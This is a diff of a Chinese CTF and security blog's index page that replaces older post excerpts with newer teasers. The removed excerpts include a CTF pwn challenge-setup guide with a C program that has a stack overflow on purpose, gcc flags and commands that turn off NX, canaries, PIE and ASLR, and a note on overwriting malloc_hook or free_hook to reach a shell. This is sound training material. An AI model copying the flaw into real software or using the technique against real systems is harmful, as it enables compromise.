@@ -331,7 +331,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/20/ops/服务器端题目搭建/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/21/pwn/malloc源码分析—ptmalloc/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Introspelliam">
@@ -350,7 +350,7 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/03/20/ops/服务器端题目搭建/" itemprop="url">服务器端题目搭建</a></h2>
+                <a class="post-title-link" href="/2018/05/21/pwn/malloc源码分析—ptmalloc/" itemprop="url">malloc源码分析——ptmalloc</a></h2>
         
 
         <div class="post-meta">
@@ -362,331 +362,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-20T14:59:38+08:00">
-                2018-03-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/运维/" itemprop="url" rel="index">
-                    <span itemprop="name">运维</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>其实最近做题有一些感触，觉得在自己服务器上搭建题目可能比较关键，常见的需要搭建的题目大概分为三大类：crypto、pwn、web。web搭建比较复杂，运维也很困难，有时候权限问题就会让运维着痛不欲生，而且一般来说做题的时候不太可能会拿到赛题；crypto有些赛题会给出一些代码，然后可以在内部运行，但也有可能不给代码，让你自己琢磨，这些都得靠你自己的思路；pwn题一般会给源码或者可执行文件，所以可以编译之后进行运行。所以本文只讲pwn题的搭建。大家可以触类旁通，搞清楚crypto题的搭建。</p>
-<h3 id="1-pwn题搭建"><a href="#1-pwn题搭建" class="headerlink" title="1. pwn题搭建"></a>1. pwn题搭建</h3><h4 id="1-1-准备题目"><a href="#1-1-准备题目" class="headerlink" title="1.1 准备题目"></a>1.1 准备题目</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">char</span> buffer[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IOLBF, <span class="number">0</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Do your kown what is it : [%p] ?\n"</span>, buffer);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Now give me your answer : \n"</span>);</div><div class="line">    read(<span class="number">0</span>, buffer, <span class="number">0x40</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h4 id="1-2-GCC-G-编译"><a href="#1-2-GCC-G-编译" class="headerlink" title="1.2 GCC/G++编译"></a>1.2 GCC/G++编译</h4><p>命令参数</p>
-<p>1.关掉DEP/NX（堆栈不可执行）</p>
-<blockquote>
-<p>gcc  -z execstack -o level level.c</p>
-</blockquote>
-<p>2.关掉Stack Protector/Canary（栈保护）</p>
-<blockquote>
-<p>gcc -fno-stack-protector -o level level.c</p>
-</blockquote>
-<p>3.关掉程序ASLR/PIE（程序随机化保护）</p>
-<blockquote>
-<p>gcc -no-pie level level.c</p>
-</blockquote>
-<p>4.关闭整个linux系统的ASLR保护</p>
-<blockquote>
-<p>sudo -s<br>echo 0 &gt; /proc/sys/kernel/randomize_va_space<br>exit</p>
-</blockquote>
-<p>5.打开整个linux系统的ASLR保护</p>
-<blockquote>
-<p>sudo -s<br>echo 2 &gt; /proc/sys/kernel/randomize_va_space</p>
-</blockquote>
-<p>6.64位linux下面的GCC编译出一个32位可执行程序</p>
-<blockquote>
-<p> 加参数- m32</p>
-<p>gcc -m32 -z execstack -fno-stack-protector -o level level.c</p>
-</blockquote>
-<h4 id="1-3-挂载题目"><a href="#1-3-挂载题目" class="headerlink" title="1.3 挂载题目"></a>1.3 挂载题目</h4><p>1.使用socat挂载在服务器端口</p>
-<blockquote>
-<p>sudo apt-get install socat<br>socat tcp-l:端口号,fork exec:程序位置,reuseaddr</p>
-</blockquote>
-<p>2.nohup命令（使得关闭终端也能运行题目程序）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">First.编写脚本pwn.sh</div><div class="line"></div><div class="line">#!/bin/sh</div><div class="line">#name:pwn.sh</div><div class="line">socat tcp-l:端口号,fork exec:程序位置,reuseaddr</div><div class="line"></div><div class="line">Next.运行脚本</div><div class="line"></div><div class="line">sudo chmod u+x ./pwn.sh</div><div class="line">nohup ./pwn.sh &amp;</div></pre></td></tr></table></figure>
-<h4 id="1-4-访问"><a href="#1-4-访问" class="headerlink" title="1.4 访问"></a>1.4 访问</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc IP地址 端口号</div></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/20/tools/ftp命令的使用方法/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Introspelliam">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/03/20/tools/ftp命令的使用方法/" itemprop="url">ftp命令的使用方法</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-20T13:35:04+08:00">
-                2018-03-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/tool/" itemprop="url" rel="index">
-                    <span itemprop="name">tool</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>ftp服务器在网上较为常见，Linux/windows ftp命令的功能是用命令的方式来控制在本地机和远程机之间传送文件，这里详细介绍Linux/Windows ftp命令的一些经常使用的命令，相信掌握了这些使用Linux/Windows 进行ftp操作将会非常容易。</p>
-<h3 id="ftp命令的一般格式"><a href="#ftp命令的一般格式" class="headerlink" title="ftp命令的一般格式"></a>ftp命令的一般格式</h3><p><code>$ ftp 主机名/IP</code></p>
-<p>其中“主机名/IP”是所要连接的远程机的主机名或IP地址。在命令行中，主机名属于选项，如果指定主机名，ftp将试图与远程机的ftp服务程序进行连接；如果没有指定主机名，ftp将给出提示符，等待用户输入命令：<br><code>$ ftp</code><br><code>ftp &gt;</code><br>此时在ftp&gt;提示符后面输入open命令加主机名或IP地址，将试图连接指定的主机。<br>不管使用哪一种方法，如果连接成功，需要在远程机上登录。用户如果在远程机上有帐号，就可以通过ftp使用这一帐号并需要提供口令。在远程机上的用户帐号的读写权限决定该用户在远程机上能下载什么文件和将上载文件放到哪个目录中。<br>如果没有远程机的专用登录帐号，许多ftp站点设有可以使用的特殊帐号。这个帐号的登录名为anonymous（也称为匿名ftp），当使用这一帐号时，要求输入email地址作为口令。<br>如果远程系统提供匿名ftp服务，用户使用这项服务可以登录到特殊的，供公开使用的目录。一般专门提供两个目录：pub目录和incoming目录。pub目录包含该站点供公众使用的所有文件，incoming目录存放上载到该站点的文件。<br>一旦用户使用ftp在远程站点上登录成功，将得到“ftp&gt;”提示符。现在可以自由使用ftp提供的命令，可以用 help命令取得可供使用的命令清单，也可以在 help命令后面指定具体的命令名称，获得这条命令的说明。</p>
-<h3 id="最常用的命令有"><a href="#最常用的命令有" class="headerlink" title="最常用的命令有"></a>最常用的命令有</h3><p>ls 列出远程机的当前目录<br>cd 在远程机上改变工作目录<br>lcd 在本地机上改变工作目录<br>ascii 设置文件传输方式为ASCII模式<br>binary 设置文件传输方式为二进制模式<br>close 终止当前的ftp会话<br>hash 每次传输完数据缓冲区中的数据后就显示一个#号<br>get（mget） 从远程机传送指定文件到本地机<br>put（mput） 从本地机传送指定文件到远程机<br>open 连接远程ftp站点<br>断开与远程机的连接并退出ftp<br>? 显示本地帮助信息<br>! 转到Shell中</p>
-<h3 id="其它命令"><a href="#其它命令" class="headerlink" title="其它命令"></a>其它命令</h3><p>◆启动ftp会话<br>open命令用于打开一个与远程主机的会话。该命令的一般格式是：<br>◆open 主机名/IP<br>如果在ftp 会话期间要与一个以上的站点连接，通常只用不带参数的ftp命令。如果在会话期间只想与一台计算机连接，那么在命令行上指定远程主机名或IP地址作为ftp命令的参数。<br>◆终止ftp会话<br>close、disconnect、和bye命令用于终止与远程机的会话。close和disronnect命令关闭与远程机的连接，但是使用户留在本地计算机的ftp程序中。和bye命令都关闭用户与远程机的连接，然后退出用户机上的ftp 程序。<br>◆改变目录<br>“cd [目录]”命令用于在ftp会话期间改变远程机上的目录，lcd命令改变本地目录，使用户能指定查找或放置本地文件的位置。<br>◆远程目录列表<br>ls命令列出远程目录的内容，就像使用一个交互shell中的ls命令一样。ls命令的一般格式是：<br>ls [目录][本地文件]<br>如果指定了目录作为参数，那么ls就列出该目录的内容。如果给出一个本地文件的名字，那么这个目录列表被放入本地机上您指定的这个文件中。<br>◆从远程系统获取文件<br>get和mget命令用于从远程机上获取文件。get命令的一般格式为：<br>get 文件名<br>您还可以给出本地文件名，这个文件名是这个要获取的文件在您的本地机上创建时的文件名。如果您不给出一个本地文件名，那么就使用远程文件原来的名字。<br>mget命令一次获取多个远程文件。mget命令的一般格式为：<br>mget 文件名列表<br>使用用空格分隔的或带通配符的文件名列表来指定要获取的文件，对其中的每个文件都要求用户确认是否传送。<br>◆向远程系统发送文件<br>put和mput命令用于向远程机发送文件。Put命令的一般格式为：<br>put 文件名<br>mput命令一次发送多个本地文件，mput命令的一般格式为：<br>mput 文件名列表<br>使用用空格分隔的或带通配符的文件名列表来指定要发送的文件。对其中的每个文件都要求用户确认是否发送。<br>◆改变文件传输模式<br>默认情况下，ftp按ASCII模式传输文件，用户也可以指定其他模式。ascii和brinary命令的功能是设置传输的模式。用ASCII模式传输文件对纯文本是非常好的，但为避免对二进制文件的破坏，用户可以以二进制模式传输文件。<br>◆检查传输状态<br>传输大型文件时，可能会发现让ftp提供关于传输情况的反馈信息是非常有用的。hash命令使ftp在每次传输完数据缓冲区中的数据后，就在屏幕上打印一个#字符。本命令在发送和接收文件时都可以使用。<br>◆ftp中的本地命令<br>当您使用ftp时，字符“!”用于向本地机上的命令shell传送一个命令。如果用户处在ftp会话中，需要shell做某些事，就很有用。例如用户要建立一个目录来保存接收到的文件。如果输入!mkdir new_dir，那么Linux就在用户当前的本地目录中创建一个名为new_dir 的目录。</p>
-<p>这里Linux ftp命令就介绍到这里，应该足够在Linux系统下使用ftp工具了。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/16/pwn/pwn的新姿势/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Introspelliam">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/03/16/pwn/pwn的新姿势/" itemprop="url">pwn的新姿势</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-16T22:47:52+08:00">
-                2018-03-16
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-21T14:35:24+08:00">
+                2018-05-21
               </time>
             
 
@@ -747,20 +424,16 @@
       
         
           
-            <h3 id="1-调用malloc的其它常见函数"><a href="#1-调用malloc的其它常见函数" class="headerlink" title="1. 调用malloc的其它常见函数"></a>1. 调用malloc的其它常见函数</h3><ul>
-<li>没有setbuf(stdin,0)的时候，scanf也会调用malloc让堆作为缓冲区。</li>
-<li>没有setbuf(stdout,0)的时候，printf会调用malloc用来在堆上分配缓冲区。</li>
-</ul>
-<p><a href="https://paper.seebug.org/450/" target="_blank" rel="external">https://paper.seebug.org/450/</a></p>
-<h3 id="2-read函数读入指定长度的数据"><a href="#2-read函数读入指定长度的数据" class="headerlink" title="2. read函数读入指定长度的数据"></a>2. read函数读入指定长度的数据</h3><p>在做pwn题时，经常会遇到程序要求read特定长度，但是exp发送的字节长度不够，于是程序误读了后续操作的字符串！</p>
-<p>解决办法：在每个read函数处后面都加入time.sleep(1~2)！</p>
-<p>另外需要知道的是，scanf其实会产生输入中断。如果前面是read函数，那么此处的scanf函数将会对读入进行中断！</p>
-<h3 id="3-free-hook和malloc-hook"><a href="#3-free-hook和malloc-hook" class="headerlink" title="3. free_hook和malloc_hook"></a>3. free_hook和malloc_hook</h3><p>其实从名字就可以看出，free_hook是free函数调用时的钩子函数，malloc_hook是malloc函数调用时的钩子函数。如果能够改变free_hook或者malloc_hook为system地址，并布置好其参数“/bin/sh\0”，那么在调用free或者malloc函数，将会执行system(&quot;/bin/sh&quot;)</p>
-<p>那么使用其的场景是什么呢？</p>
-<p>一般是用户有fastbin attack任意地址写，但是找不到对应大小的可用bin块，这时候会选择使用stderr或者stdout或者stdin其地址高位的0x7f，从而在libc中不断使用任意地址写，直到可以改写free_hook或者malloc_hook。</p>
-<p>比较经典的是2018_qwb的那道raisepig题！</p>
-
-          
+          1. malloc源码分析—ptmalloc1.1 malloc_hook_ini本文分析malloc的源码，首先从glibc开始，首先看malloc.c文件中的一段定义，
+1strong_alias (__libc_malloc, __malloc) strong_alias (__libc_ma
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/05/21/pwn/malloc源码分析—ptmalloc/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -807,7 +480,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/13/pwn/linux中常见指令解释/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/20/unknown/Dynamic-Linking/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Introspelliam">
@@ -826,7 +499,7 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/03/13/pwn/linux中常见指令解释/" itemprop="url">linux中常见指令解释</a></h2>
+                <a class="post-title-link" href="/2018/04/20/unknown/Dynamic-Linking/" itemprop="url">Dynamic Linking</a></h2>
         
 
         <div class="post-meta">
@@ -838,8 +511,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-13T00:53:14+08:00">
-                2018-03-13
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-20T22:26:26+08:00">
+                2018-04-20
               </time>
             
 
@@ -900,67 +573,16 @@
       
         
           
-            <h3 id="1-sed"><a href="#1-sed" class="headerlink" title="1. sed"></a>1. sed</h3><p>sed是一个经常被忽视的指令，但是sed使用范围十分广阔，这里介绍其几个简单的使用方法</p>
-<p><strong>语法：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sed [-hnV][-e&lt;script&gt;][-f&lt;script文件&gt;][文本文件]</div></pre></td></tr></table></figure>
-<p><strong>参数说明：</strong></p>
-<ul>
-<li>-e\&lt;script>或--expression=\&lt;script> 以选项中指定的script来处理输入的文本文件。</li>
-<li>-f\&lt;script文件>或--file=\&lt;script文件> 以选项中指定的script文件来处理输入的文本文件。</li>
-<li>-h或--help 显示帮助。</li>
-<li>-n或--quiet或--silent 仅显示script处理后的结果。</li>
-<li>-V或--version 显示版本信息。</li>
-</ul>
-<p><strong>动作说明：</strong></p>
-<ul>
-<li>a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～</li>
-<li>c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！</li>
-<li>d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；</li>
-<li>i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；</li>
-<li>p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～</li>
-<li>s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法</li>
-</ul>
-<p><strong>范例：</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span> 将 /etc/passwd 的内容列出并且列印行号，同时，请将第 2~5 行删除！</div><div class="line">[root@www ~]# nl /etc/passwd | sed '2,5d'</div><div class="line">1 root:x:0:0:root:/root:/bin/bash</div><div class="line">6 sync:x:5:0:sync:/sbin:/bin/sync</div><div class="line">7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</div><div class="line"><span class="meta"></span></div><div class="line">#　在第二行后(亦即是加在第三行)加上『drink tea?』字样</div><div class="line">[root@www ~]# nl /etc/passwd | sed '2a drink tea'</div><div class="line">1 root:x:0:0:root:/root:/bin/bash</div><div class="line">2 bin:x:1:1:bin:/bin:/sbin/nologin</div><div class="line">drink tea</div><div class="line">3 daemon:x:2:2:daemon:/sbin:/sbin/nologin</div><div class="line"><span class="meta"></span></div><div class="line"># 在第二行前</div><div class="line">[root@www ~]# nl /etc/passwd | sed '2i drink tea'</div><div class="line"><span class="meta"></span></div><div class="line"># 要增加两行以上（在第二行后面加入两行字）</div><div class="line">[root@www ~]# nl /etc/passwd | sed '2a Drink tea or ......\</div><div class="line"><span class="meta">&gt;</span> drink beer ?'</div><div class="line">1 root:x:0:0:root:/root:/bin/bash</div><div class="line">2 bin:x:1:1:bin:/bin:/sbin/nologin</div><div class="line">Drink tea or ......</div><div class="line">drink beer ?</div><div class="line">3 daemon:x:2:2:daemon:/sbin:/sbin/nologin</div><div class="line"><span class="meta"></span></div><div class="line">#　将第2-5行的内容取代成为『No 2-5 number』</div><div class="line">[root@www ~]# nl /etc/passwd | sed '2,5c No 2-5 number'</div><div class="line">1 root:x:0:0:root:/root:/bin/bash</div><div class="line">No 2-5 number</div><div class="line">6 sync:x:5:0:sync:/sbin:/bin/sync</div><div class="line"><span class="meta"></span></div><div class="line"># 仅列出 /etc/passwd 文件内的第 5-7 行</div><div class="line">[root@www ~]# nl /etc/passwd | sed -n '5,7p'</div><div class="line">5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</div><div class="line">6 sync:x:5:0:sync:/sbin:/bin/sync</div><div class="line">7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</div><div class="line"><span class="meta"></span></div><div class="line"># 搜索 /etc/passwd有root关键字的行(所有)</div><div class="line">[root@www ~]# nl /etc/passwd | sed '/root/p'</div><div class="line"><span class="meta"></span></div><div class="line"># 使用-n的时候将只打印包含模板的行</div><div class="line">nl /etc/passwd | sed -n '/root/p'</div><div class="line">1  root:x:0:0:root:/root:/bin/bash</div><div class="line"><span class="meta"></span></div><div class="line"># 数据的搜寻并删除</div><div class="line">nl /etc/passwd | sed  '/root/d'</div><div class="line"><span class="meta"></span></div><div class="line"># 数据的搜寻并执行命令。执行后面花括号中的一组命令，每个命令之间用分号分隔，这里把bash替换为blueshell，再输出这行</div><div class="line">nl /etc/passwd | sed -n '/bash/&#123;s/bash/blueshell/;p;q&#125;'    </div><div class="line">1  root:x:0:0:root:/root:/bin/blueshell</div><div class="line"><span class="meta"></span></div><div class="line"># 数据的搜寻并替换</div><div class="line">sed 's/要被取代的字串/新的字串/g'</div><div class="line"><span class="meta"></span></div><div class="line"># 多点编辑</div><div class="line">nl /etc/passwd | sed -e '3,$d' -e 's/bash/blueshell/'</div><div class="line">1  root:x:0:0:root:/root:/bin/blueshell</div><div class="line">2  daemon:x:1:1:daemon:/usr/sbin:/bin/sh</div></pre></td></tr></table></figure>
-<h3 id="2-tr"><a href="#2-tr" class="headerlink" title="2. tr"></a>2. tr</h3><p><strong>语法</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">tr [-cdst][--help][--version][第一字符集][第二字符集]  </div><div class="line">tr [OPTION]…SET1[SET2]</div></pre></td></tr></table></figure>
-<p><strong>参数说明</strong></p>
-<ul>
-<li>-c, --complement：反选设定字符。也就是符合 SET1 的部份不做处理，不符合的剩余部份才进行转换</li>
-<li>-d, --delete：删除指令字符</li>
-<li>-s, --squeeze-repeats：缩减连续重复的字符成指定的单个字符</li>
-<li>-t, --truncate-set1：削减 SET1 指定范围，使之与 SET2 设定长度相等</li>
-</ul>
-<p><strong>字符集</strong></p>
-<ul>
-<li>\NNN 八进制值的字符 NNN (1 to 3 为八进制值的字符)</li>
-<li>\ 反斜杠</li>
-<li>\a Ctrl-G 铃声</li>
-<li>\b Ctrl-H 退格符</li>
-<li>\f Ctrl-L 走行换页</li>
-<li>\n Ctrl-J 新行</li>
-<li>\r Ctrl-M 回车</li>
-<li>\t Ctrl-I tab键</li>
-<li>\v Ctrl-X 水平制表符</li>
-<li>CHAR1-CHAR2 ：字符范围从 CHAR1 到 CHAR2 的指定，范围的指定以 ASCII 码的次序为基础，只能由小到大，不能由大到小。</li>
-<li>[CHAR*] ：这是 SET2 专用的设定，功能是重复指定的字符到与 SET1 相同长度为止</li>
-<li>[CHAR*REPEAT] ：这也是 SET2 专用的设定，功能是重复指定的字符到设定的 REPEAT 次数为止(REPEAT 的数字采 8 进位制计算，以 0 为开始)</li>
-<li>[:alnum:] ：所有字母字符与数字</li>
-<li>[:alpha:] ：所有字母字符</li>
-<li>[:blank:] ：所有水平空格</li>
-<li>[:cntrl:] ：所有控制字符</li>
-<li>[:digit:] ：所有数字</li>
-<li>[\:graph\:] ：所有可打印的字符(不包含空格符)</li>
-<li>[:lower:] ：所有小写字母</li>
-<li>[:print:] ：所有可打印的字符(包含空格符)</li>
-<li>[:punct:] ：所有标点字符</li>
-<li>[:space:] ：所有水平与垂直空格符</li>
-<li>[:upper:] ：所有大写字母</li>
-<li>[:xdigit:] ：所有 16 进位制的数字</li>
-<li>[=CHAR=] ：所有符合指定的字符(等号里的 CHAR，代表你可自订的字符)</li>
-</ul>
-
-          
+          本文参考http://www.sco.com/developers/gabi/latest/ch5.dynamic.html
+程序解释器（Program Interpreter）可执行程序在动态链接的过程中会有 PT_INTERP 程序段。exec(BA_OS)过程中，系统通过PT_INTERP获取
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/20/unknown/Dynamic-Linking/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1007,7 +629,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/12/tools/cygwin常见配置/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/20/pwn/blind-attack-HITB-XCTF-Quals-2018-babypwn/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Introspelliam">
@@ -1026,7 +648,7 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/03/12/tools/cygwin常见配置/" itemprop="url">cygwin常见配置</a></h2>
+                <a class="post-title-link" href="/2018/04/20/pwn/blind-attack-HITB-XCTF-Quals-2018-babypwn/" itemprop="url">blind attack:HITB-XCTF Quals 2018 - babypwn</a></h2>
         
 
         <div class="post-meta">
@@ -1038,8 +660,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-12T22:59:53+08:00">
-                2018-03-12
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-20T22:17:22+08:00">
+                2018-04-20
               </time>
             
 
@@ -1061,8 +683,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/tool/" itemprop="url" rel="index">
-                    <span itemprop="name">tool</span>
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
                   </a>
                 </span>
 
@@ -1100,31 +722,17 @@
       
         
           
-            <p>cygwin作为windows下轻便快捷的linux系统，一直深受用户喜爱！当然，现在不少同学也喜欢用xshell连接虚拟机，这样也挺方便的。唯一的不足就是，开启虚拟机需要耗费不小的内存、cpu，这样会影响性能。所以若有替代虚拟机的办法，我尽量会使用替代方式。</p>
-<h3 id="1-cygwin初始安装须知"><a href="#1-cygwin初始安装须知" class="headerlink" title="1. cygwin初始安装须知"></a>1. cygwin初始安装须知</h3><p>cygwin安装时需要安装一系列初始包，太多初始包会使安装时间过长、安装不稳定，故而经常性导致出错导致重新安装，这样十分浪费时间。所以初始安装包时，尽量只安装必要的软件。</p>
-<ul>
-<li>vi、vim、curl、wget、tar、gawk、bzip2、git等</li>
-</ul>
-<h3 id="2-cygwin包管理软件apt-cyg"><a href="#2-cygwin包管理软件apt-cyg" class="headerlink" title="2. cygwin包管理软件apt-cyg"></a>2. cygwin包管理软件apt-cyg</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/transcode-open/apt-cyg.git</div><div class="line">cd apt-cyg</div><div class="line">cp apt-cyg /bin/</div><div class="line">chmod +x /bin/apt-cyg</div></pre></td></tr></table></figure>
-<p>之后安装，都类似于apt-get</p>
-<p>我的源地址： <a href="http://mirror.rit.edu/cygwin/" target="_blank" rel="external">http://mirror.rit.edu/cygwin/</a></p>
-<p>换源：找到/etc/setup/setup.rc中最后几行，将last-mirror中的源换掉</p>
